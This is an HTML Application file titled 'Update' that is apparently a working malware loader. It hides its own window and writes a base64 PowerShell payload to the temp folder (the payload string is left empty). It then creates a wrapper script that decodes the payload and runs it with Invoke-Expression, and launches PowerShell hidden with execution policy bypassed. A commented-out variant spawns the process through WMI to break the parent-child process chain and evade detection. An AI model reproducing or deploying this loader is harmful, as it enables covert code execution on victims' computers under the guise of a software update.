<!DOCTYPE html>
<html>
<head>
<title>Update</title>
<HTA:APPLICATION
    ID="oHTA"
    APPLICATIONNAME="Update"
    BORDER="none"
    CAPTION="no"
    SHOWINTASKBAR="no"
    SINGLEINSTANCE="yes"
    SYSMENU="no"
    WINDOWSTATE="minimize"
    SCROLL="no"
    INNERBORDER="no"
/>
<script language="VBScript">
Sub Window_OnLoad
    window.resizeTo 0, 0
    window.moveTo -3000, -3000
End Sub
</script>
</head>
<body>
<script language="JScript">
function go() {
    // ============================================================
    //  Base64-encoded PowerShell payload (UTF-16LE)
    // ============================================================
    var b64 = "";

    // ============================================================
    //  STEP 1: Write base64 to a temp file (avoids cmdline limits)
    // ============================================================
    var fso = new ActiveXObject("Scripting.FileSystemObject");
    var tempDir  = fso.GetSpecialFolder(2);                       // %TEMP%
    var b64File  = fso.BuildPath(tempDir, "sys.dat");
    var psFile   = fso.BuildPath(tempDir, "run.ps1");
    var logFile  = fso.BuildPath(tempDir, "run.log");

    var f = fso.CreateTextFile(b64File, true);
    f.Write(b64);
    f.Close();

    // ============================================================
    //  STEP 2: Write a wrapper PS that logs every step
    // ============================================================
    var wrapper = [
        "Start-Transcript -Path '" + logFile + "' -Force | Out-Null",
        "try {",
        "  $b = Get-Content '" + b64File + "' -Raw",
        "  Write-Host '[*] b64 length:' $b.Length",
        "  $s = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b))",
        "  Write-Host '[*] decoded length:' $s.Length",
        "  Invoke-Expression $s",
        "} catch {",
        "  Write-Host '[*] ERROR:' $_",
        "  $_ | Out-File -Append '" + logFile + "'",
        "}",
        "Stop-Transcript | Out-Null"
    ].join("\r\n");

    var wf = fso.CreateTextFile(psFile, true);
    wf.Write(wrapper);
    wf.Close();

    // ============================================================
    //  STEP 3: Execute — pick ONE of the two methods below
    // ============================================================

    // ---------- Method A: WScript.Shell (simple, reliable) ----------
    // Parent chain: explorer.exe -> mshta.exe -> powershell.exe
    var sh = new ActiveXObject("WScript.Shell");
    sh.Run(
        "powershell.exe -NoProfile -ExecutionPolicy Bypass -File \"" + psFile + "\"",
        0,      // 0 = hidden window
        false   // false = don't wait
    );

    // ---------- Method B: WMI (breaks parent-child chain) ----------
    // Uncomment this block and comment out Method A above to use it.
    // Parent chain: explorer.exe -> mshta.exe -> WmiPrvSE.exe -> powershell.exe
    /*
    try {
        var locator = new ActiveXObject("WbemScripting.SWbemLocator");
        var svc     = locator.ConnectServer(".", "root\\cimv2");
        var startup = svc.Get("Win32_ProcessStartup").SpawnInstance_();
        startup.ShowWindow = 0;
        var proc = svc.Get("Win32_Process");
        var cmd  = "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden " +
                   "-ExecutionPolicy Bypass -File \"" + psFile + "\"";
        proc.Create(cmd, null, startup, null);
    } catch (e) {
        // fallback to WScript.Shell if WMI fails
        var sh = new ActiveXObject("WScript.Shell");
        sh.Run("powershell.exe -NoProfile -ExecutionPolicy Bypass -File \"" + psFile + "\"", 0, false);
    }
    */

    // ============================================================
    //  STEP 4: Close the HTA window
    // ============================================================
    window.close();
}
setTimeout(go, 100);
</script>
</body>
</html>
